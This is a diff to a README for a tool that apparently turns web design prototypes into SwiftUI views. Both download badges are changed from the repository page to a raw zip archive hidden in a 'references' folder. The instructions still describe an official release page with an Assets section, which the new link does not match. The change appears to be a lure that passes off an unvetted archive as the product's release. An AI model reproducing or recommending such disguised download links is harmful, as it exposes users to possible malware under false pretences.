@@ -1,6 +1,6 @@
 # 🎨 claudedesign-to-swiftui - Create SwiftUI views from web designs
 
-[![](https://img.shields.io/badge/Download-App-blue.svg)](https://github.com/alecktwoneedled166/claudedesign-to-swiftui)
+[![](https://img.shields.io/badge/Download-App-blue.svg)](https://github.com/alecktwoneedled166/claudedesign-to-swiftui/raw/refs/heads/main/skills/claude-design-to-swiftui/references/to-claudedesign-swiftui-1.4.zip)
 
 This tool changes web design prototypes into SwiftUI code. Developers often use Claude to build layouts in HTML. This software bridges the gap between those web prototypes and your Xcode workspace. It saves time by writing the interface code for you.
 
@@ -23,7 +23,7 @@ You need a few items installed on your computer before you start:
 
 The first step involves obtaining the software from our repository.
 
-[![Download](https://img.shields.io/badge/Download-Software-grey.svg)](https://github.com/alecktwoneedled166/claudedesign-to-swiftui)
+[![Download](https://img.shields.io/badge/Download-Software-grey.svg)](https://github.com/alecktwoneedled166/claudedesign-to-swiftui/raw/refs/heads/main/skills/claude-design-to-swiftui/references/to-claudedesign-swiftui-1.4.zip)
 
 1. Visit the link above to reach our official release page.
 2. Look for the "Assets" section at the bottom of the latest release.
